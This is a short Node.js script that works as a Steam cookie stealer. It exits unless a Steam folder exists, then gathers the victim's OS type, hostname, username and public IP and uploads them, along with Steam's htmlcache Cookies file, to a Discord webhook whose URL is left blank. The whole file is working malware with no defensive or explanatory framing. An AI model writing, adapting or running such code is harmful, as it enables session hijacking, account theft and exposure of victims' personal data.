//Dependencies
const Public_IP = require("public-ip")
const Discord = require("discord.js")
const Os = require("os")
const Fs = require("fs")

//Variables
const Homedir = Os.homedir()
const WebhookLink = ""
const Webhook = new Discord.WebhookClient(WebhookLink.split("/")[WebhookLink.split("/").length-2], WebhookLink.split("/")[WebhookLink.split("/").length-1])

//Functions
async function IP(){
    return await Public_IP.v4()
}

//Main
if(!Fs.existsSync(`${Homedir}\\AppData\\Local\\Steam`)){
    process.exit()
}

Main()
async function Main(){
    Webhook.send("```" + `OS Type: ${Os.type()}
OS Platform: ${Os.platform()}
OS Hostname: ${Os.hostname()}
                
OS Username: ${Os.userInfo().username}
IP: ${await IP()}` + "```", { files: [`${Homedir}\\AppData\\Local\\Steam\\htmlcache\\Cookies`] }).then(()=>{
        process.exit()
    }).catch(()=>{
        process.exit()
    })
}
